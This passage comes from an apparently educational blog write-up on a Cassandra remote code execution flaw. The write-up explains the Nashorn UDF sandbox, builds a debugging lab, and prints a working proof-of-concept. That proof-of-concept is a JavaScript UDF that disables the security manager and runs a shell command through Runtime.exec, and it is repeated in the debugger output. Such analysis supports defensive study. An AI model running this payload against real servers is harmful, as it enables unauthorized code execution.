highlighter-rouge&quot;&gt;argCodecs&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;returnCodec&lt;/code&gt;, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;keyspaceMetadata&lt;/code&gt; parameters and The results object is assigned to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;udfContext&lt;/code&gt; instance variable.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/293b4f215b0ef9f3b3b89022d505c663&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;Now, We arrived to the funny part in the code where it try to create the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UDF&lt;/code&gt;. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tryCreate&lt;/code&gt; method will take the parameters we mentioned before and try to to create the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UDF&lt;/code&gt; by passing it to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;create()&lt;/code&gt; function. If we scroll down to take a look at the function we can see it as the following:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/dba600a3230887c9d1c09d7739f8a62a&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;The function has a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;switch&lt;/code&gt; statment to check the language of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UDF&lt;/code&gt;, If it’s &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Java&lt;/code&gt;, Then it will create the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UDF&lt;/code&gt; using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JavaBasedUDFunction()&lt;/code&gt; function which can be found as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;src/java/org/apache/cassandra/cql3/functions/JavaBasedUDFunction.java&lt;/code&gt; class which represent the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UDF&lt;/code&gt; implemention in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Java&lt;/code&gt;,If not then it will create it using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ScriptBasedUDFunction()&lt;/code&gt; function which can be found as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;src/java/org/apache/cassandra/cql3/functions/ScriptBasedUDFunction.java&lt;/code&gt; class which represent the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UDF&lt;/code&gt; implemention in scripting languages as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JavaScript&lt;/code&gt;. If we go to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ScriptBasedUDFunction.java&lt;/code&gt; class we will be able to see the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Nashron&lt;/code&gt; sandbox implemention, Let’s discover the class to make everything more clear.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/9ad0dc1bf1b8aa5bacda240b6b948ef4&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;The class starts with the declaration of two variables &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;protectionDomain&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;accessControlContext&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ProtectionDomain&lt;/code&gt; holds information about the protection domain of the class and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AccessControlContext&lt;/code&gt; represents the access control context for the class.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/8592c862db692dd2d731c20f17806904&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;Here it defines the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;allowedPackagesArray&lt;/code&gt; variable which is an array of strings representing the allowed packages for the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Nashorn&lt;/code&gt; script engine. These allowed packages determine which packages and classes are accessible within the sandboxed environment for executing the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UDFs&lt;/code&gt; and this inclusion of specific packages ensures that necessary classes and functionalities required by the scripts and the environment are accessible while maintaining security and preventing unauthorized access to sensitive classes or resources.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/b8f95ec5698e02707ed0fb55dca7a293&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;When we scroll down we can notice The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UDFExecutorService&lt;/code&gt; which is a custom executor service used for executing the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UDFs&lt;/code&gt; and It takes parameters such as a named thread factory, a class loader &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;udfClassLoader&lt;/code&gt;, a security thread group &amp;amp; a thread initialization function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UDFunction::initializeThread&lt;/code&gt; . After that out of the executor we can notice the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NashornScriptEngine&lt;/code&gt; declering and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ClassFilter&lt;/code&gt; which is an interface used by the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Nashorn&lt;/code&gt; script engine.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/91d77702582615e545a74a34714fa047&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;As we move to the next lines we can see a static block where the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nashorn&lt;/code&gt; get initialized. First, It creates an instance of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ScriptEngineManager&lt;/code&gt; and named as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;scriptEngineManager&lt;/code&gt;. Then, It retrieves &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Nashorn&lt;/code&gt; script engine into &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;engine&lt;/code&gt; variable which is a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ScriptEngine&lt;/code&gt; object. After that it checks if the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;engine&lt;/code&gt; variable is not &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;null&lt;/code&gt;, If it’s not &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;null&lt;/code&gt; it casts the factory of the script engine to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NashornScriptEngineFactory&lt;/code&gt;, if it’s &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;null&lt;/code&gt; it assigns &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;null&lt;/code&gt; to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;factory&lt;/code&gt; variable. Followed by checking if the factory is not &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;null&lt;/code&gt;. If it’s not &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;null&lt;/code&gt; it will create a new &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Nashorn&lt;/code&gt; script engine using the factory &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getScriptEngine&lt;/code&gt; method and pass empty string array, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;udfClassLoader&lt;/code&gt; as the class loader &amp;amp; the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;classFilter&lt;/code&gt; as the class filter which defined in the above lines wie discuss before. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AccessControlContext&lt;/code&gt; encapsulates the context in which a set of permissions is checked for access control decisions.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/de7c6eadb26da08c410758670434512a&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;Here a constructor initializes a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ScriptBasedUDFunction&lt;/code&gt; instance by compiling the script, performing necessary checks &amp;amp; security measures and setting up the execution context. First it checks if the language specified is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JavaScript&lt;/code&gt; and if the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;scriptEngine&lt;/code&gt; is not &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;null&lt;/code&gt;, If the language is invalid or the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;scriptEngine&lt;/code&gt; is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;null&lt;/code&gt; it throws an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;InvalidRequestException&lt;/code&gt; with an appropriate error message. Then, it attempts to compile the body of the script using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;scriptEngine&lt;/code&gt;and compilation is executed with no permissions to prevent potentially malicious code from running, such as code in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;static code blocks&lt;/code&gt; or during class initialization &amp;amp; it’s done by using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AccessController.doPrivileged()&lt;/code&gt; with a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PrivilegedExceptionAction&lt;/code&gt; that compiles the script. Finally, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;accessControlContext&lt;/code&gt; is used as the access control context for this privileged action If an exception occurs during the compilation process an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;InvalidRequestException&lt;/code&gt; is thrown with a formatted error message. After that an instance of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UDFContextWrapper&lt;/code&gt; is created and assigned to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;udfContextBinding&lt;/code&gt; variable and it serves as a binding for the script execution context.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/66e0e7bd597ad09128ff21b7e4ba16dc&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;In this code section it first returns the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;executor&lt;/code&gt; instance which is an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ExecutorService&lt;/code&gt; used for executing tasks asynchronously in the codebase. Then, we have &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;executeUserDefined()&lt;/code&gt; function prepares the parameters &amp;amp; execute the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UDF&lt;/code&gt; script and converts the result into a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ByteBuffer&lt;/code&gt; to be returned.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/5ad7c81676d4c43d9719d1b9ad68fe93&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;Then &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;executeAggregateUserDefined()&lt;/code&gt; function prepares the parameters &amp;amp; call the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;executeScriptInternal()&lt;/code&gt; method with the prepared parametersand return the result of executing the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UDF&lt;/code&gt;aggregate function.&lt;/p&gt;

&lt;h2 id=&quot;enable_user_defined_functions_threads&quot;&gt;&lt;strong&gt;enable_user_defined_functions_threads&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;enable_user_defined_functions_threads&lt;/code&gt; is a configuration option and when it’s enabled, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UDF&lt;/code&gt; execution is offloaded to a dedicated thread pool which allowing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UDFs&lt;/code&gt; to be executed concurrently with other queries. And the main problem is here cause when this option is disabled the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UDF&lt;/code&gt; runs in the daemon thread, As a results we has permissions to call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;setSecurityManager&lt;/code&gt; which allow us to disable the security manager in cassandra, As a results we will be able to bypass the class filtering and we will be able to include critical or blacklisted calsses to execute codes on the system as when we running the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JS&lt;/code&gt; code in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Nashron&lt;/code&gt; we can access &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Nashorn&lt;/code&gt; instance engine, through the access we have to the engine property. We can find the implementation of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SecurityManager&lt;/code&gt; at the following class &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;src/java/org/apache/cassandra/security/ThreadAwareSecurityManager.java&lt;/code&gt; the class is providing a mechanism for controlling and enforcing security permissions in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Cassandra&lt;/code&gt; which allowing fine-grained access control for different operations and resources.&lt;/p&gt;

&lt;h1 id=&quot;exploitation&quot;&gt;&lt;strong&gt;Exploitation&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;It’s the time to see how we can exploit the vulnerability before do our dynamic analysis on it. So, we be able to understand what we are debugging or analysis dynamically.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;CREATE KEYSPACE test WITH replication = {'class': 'SimpleStrategy', 'replication_factor' : 3};
use test;
CREATE TABLE tab (cmd text PRIMARY KEY) WITH comment='Important biological records';
create or replace function test.exec(name text) RETURNS NULL ON NULL INPUT RETURNS text LANGUAGE javascript AS $$
var System = Java.type(&quot;java.lang.System&quot;);System.setSecurityManager(null);this.engine.factory.scriptEngine.eval('java.lang.Runtime.getRuntime().exec(&quot;touch /tmp/Pwn3d.txt&quot;)');name $$;
insert into tab(cmd) values('test');
select exec(cmd) from tab;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UDF&lt;/code&gt; will run in a daemon thread as the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;enable_user_defined_functions_threads&lt;/code&gt; option is disabled, As a results we can have permissions to control &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;setSecurityManager&lt;/code&gt; and we can see in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UDF&lt;/code&gt; we set it to null so we can bypass the class filteration &amp;amp; with the access to engine property we create a new engine instance and call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;eval()&lt;/code&gt; function from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JS&lt;/code&gt; &amp;amp; finally, Our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JAVA&lt;/code&gt; code in it to execute a command using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Runtime&lt;/code&gt; from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Java&lt;/code&gt;. In our case, The code will create a file named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Pwn3d.txt&lt;/code&gt; under the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/tmp&lt;/code&gt; directory on the server as a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PoC&lt;/code&gt;. Let’s Run the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UDF&lt;/code&gt; and check it out:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/6b7aff97bceb750b4919b7cef5e396bd&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;dynamic-analysis&quot;&gt;&lt;strong&gt;Dynamic Analysis&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;Now, We under stand how is the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Nashorn&lt;/code&gt; is implemented, How the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UDFs&lt;/code&gt; get executed the security manager &amp;amp; the class filtering mechanism. It’s time to see the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UDFs&lt;/code&gt; run in action and in the default settings while we debug it &amp;amp; see the difference dynamically when the security manager is on &amp;amp; When it’s off. We already configured the debugger before when we were setting up our testing lab. Note: For debugging people may face problems when debugging on docker, So we gonna build &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cassandra&lt;/code&gt; easily and debug it locally from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kali&lt;/code&gt; machine. First download &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Cassandra-4.0.0&lt;/code&gt; from &lt;a href=&quot;https://github.com/apache/cassandra/releases/tag/cassandra-4.0.0&quot;&gt;here&lt;/a&gt;. Now, extract it and install apache &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ant&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo apt install ant
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now, let’s build &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Cassandra&lt;/code&gt; by using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ant&lt;/code&gt; command:&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/b3d98949b826e6ded237155502d1cfd8&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;After building is done, Let’s enable debugging by exporting the following variable in our environmenrt:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;export JVM_EXTRA_OPTS=&quot;-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=1414&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/88aa140a54b34b17a6182319fa21c4b8&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;Before we run the app let’s edit the options in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cassandra.yaml&lt;/code&gt; file under the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;conf&lt;/code&gt; directory &amp;amp; add the following options:&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/46966a024e7336f5bf6e2e5b41dc17f6&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now, Run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Cassandra&lt;/code&gt; using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;./bin/cassandra&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/fc1887398d44f7823e8670b69fca7e10&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;The app is running, go to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Run&lt;/code&gt; Tab and then click on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Edit Configurations&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/1c61f6f4605d01e3ca60d6572b7a7c20&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;Then Click on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;+&lt;/code&gt; add sign and choose &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Remote JVM Debug&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/a10d9e442d9dd36639ae044263dc5133&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;And Name it as you want &amp;amp; configure the remote debugger, By adding the machine &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IP&lt;/code&gt;, Debugging port which is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1414&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/c44ddbf21db95506cddb437d7c8a54b9&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;Finally, Let’s Set the breakpoint on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;private static final UDFExecutorService executor&lt;/code&gt; inside of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;src/java/org/apache/cassandra/security/ThreadAwareSecurityManager.java&lt;/code&gt; class.&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/ffdd996f0d8526a238f4e551ad3b29df&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;Now, Let’s click on the debugging button&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/96d9faea99bf7a8f76d33ee09836eb9f&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/f99c6e7b3b0448cd71e1359f443d8612&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;Next, execute our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UDF&lt;/code&gt; again:&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/d3f17d79c90f76f972c3eb6554419f2d&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;As you can see because we set the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;enable_user_defined_functions_threads&lt;/code&gt; otpion to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;true&lt;/code&gt;, The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UDF&lt;/code&gt; not running in a daemon thread. Therefor, We don’t have the permissions to control &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;setSecurityManager&lt;/code&gt;. So, We got this execption massege.&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/7f76716da9a50302d1ef3563905c440d&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;When we go to our debugger here clearly we have the members of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ScriptBasedUDFunction&lt;/code&gt; which are:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;protectionDomain = null
accessControlContext = null
allowedPackagesArray = {String[34]@7856} [&quot;&quot;, &quot;com&quot;, &quot;edu&quot;, &quot;java&quot;, &quot;javax&quot;, +29 more]
executor = null
classFilter = null
scriptEngine = null
logger = {Logger@7857} &quot;Logger[org.apache.cassandra.cql3.functions.UDFunction]&quot;
threadMXBean = {ThreadImpl@7858} 
allowedPatterns = {String[21]@7859} [&quot;com/google/comm...&quot;, &quot;java/io/IOExcep...&quot;, &quot;java/io/Seriali...&quot;, &quot;java/lang/&quot;, &quot;java/math/&quot;, +16 more]
disallowedPatterns = {String[34]@7860} [&quot;com/datastax/dr...&quot;, &quot;com/datastax/dr...&quot;, &quot;com/datastax/dr...&quot;, &quot;com/datastax/dr...&quot;, &quot;com/datastax/dr...&quot;, +29 more]
udfClassLoader = {UDFunction$UDFClassLoader@7861} 
$assertionsDisabled = false
NAME_COMPARATOR = {SchemaElement$lambda@7862} 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/1b14278dcc59dd26c1accba732562d10&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;Here we can see it executed the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ScriptBasedUDFunction()&lt;/code&gt; function under &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UDFunction&lt;/code&gt; class implementation as the language is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JavaScript&lt;/code&gt; &amp;amp; We can see that the body is carrying our function:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;body= var System = Java.type(&quot;java.lang.System&quot;);System.setSecurityManager(null);this.engine.factory.scriptEngine.eval('java.lang.Runtime.getRuntime().exec(&quot;touch /tmp/Pwn3d.txt&quot;)');name 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/83970774c1ba34bce93c34f9fdb1c8e7&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;After that it starts to create our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UDF&lt;/code&gt; using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;create&lt;/code&gt; method. And it’s passing the needed parameters as the following:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;this = {CreateFunctionStatement@7887} &quot;CreateFunctionStatement (test, exec)&quot;
 functionName = &quot;exec&quot;
 argumentNames = {ArrayList@7880}  size = 1
 rawArgumentTypes = {ArrayList@7937}  size = 1
 rawReturnType = {CQL3Type$Raw$RawType@7938} &quot;text&quot;
 calledOnNullInput = false
 language = &quot;javascript&quot;
 body = &quot;\nvar System = Java.type(&quot;java.lang.System&quot;);System.setSecurityManager(null);this.engine.factory.scriptEngine.eval('java.lang.Runtime.getRuntime().exec(&quot;touch /tmp/Pwn3d.txt&quot;)');name &quot;
 orReplace = true
 ifNotExists = false
 keyspaceName = &quot;test&quot;
schema = {Keyspaces@7888} &quot;[KeyspaceMetadata{name=system_schema, kind=REGULAR, params=KeyspaceParams{durable_writes=true, replication=ReplicationParams{class=org.apache.cassandra.locator.LocalStrategy}}, tables=[system_schema.keyspaces, system_schema.tables, system_schema.columns, system_schema.triggers, system_schema.dropped_columns, system_schema.views, system_schema.types, system_schema.functions, system_schema.aggregates, system_schema.indexes], views=[], functions=[], types=[]}, KeyspaceMetadata{name=system, kind=REGULAR, params=KeyspaceParams{durable_writes=true, replication=ReplicationParams{class=org.apache.cassandra.locator.LocalStrategy}}, tables=[system.&quot;IndexInfo&quot;, system.batches, system.paxos, system.local, system.peers_v2, system.peers, system.peer_events_v2, system.peer_events, system.compaction_history, system.sstable_activity, system.size_estimates, system.table_estimates, system.available_ranges_v2, system.available_ranges, system.transferred_ranges_v2, system.transferred_ranges, system.view_bu&quot;
 keyspaces = {RegularImmutableMap@7940}  size = 6
 tables = {RegularImmutableMap@7941}  size = 41
keyspace = {KeyspaceMetadata@7889} &quot;KeyspaceMetadata{name=test, kind=REGULAR, params=KeyspaceParams{durable_writes=true, replication=ReplicationParams{class=org.apache.cassandra.locator.SimpleStrategy, replication_factor=3}}, tables=[test.tab], views=[], functions=[], types=[]}&quot;
 name = &quot;test&quot;
 kind = {KeyspaceMetadata$Kind@7943} &quot;REGULAR&quot;
 params = {KeyspaceParams@7944} &quot;KeyspaceParams{durable_writes=true, replication=ReplicationParams{class=org.apache.cassandra.locator.SimpleStrategy, replication_factor=3}}&quot;
 tables = {Tables@7945} &quot;[test.tab]&quot;
 views = {Views@7946} &quot;[]&quot;
 types = {Types@7947} &quot;[]&quot;
 functions = {Functions@7948} &quot;[]&quot;
argumentTypes = {ArrayList@7881}  size = 1
 0 = {UTF8Type@7882} &quot;org.apache.cassandra.db.marshal.UTF8Type&quot;
returnType = {UTF8Type@7882} &quot;org.apache.cassandra.db.marshal.UTF8Type&quot;
 reverseComparator = {AbstractType$lambda@7922} 
 comparisonType = {AbstractType$ComparisonType@7923} &quot;BYTE_ORDER&quot;
 isByteOrderComparable = true
